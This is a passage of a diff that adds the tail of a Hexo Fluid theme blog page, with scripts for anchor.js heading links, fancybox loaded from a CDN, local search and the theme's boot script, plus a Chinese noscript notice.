+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
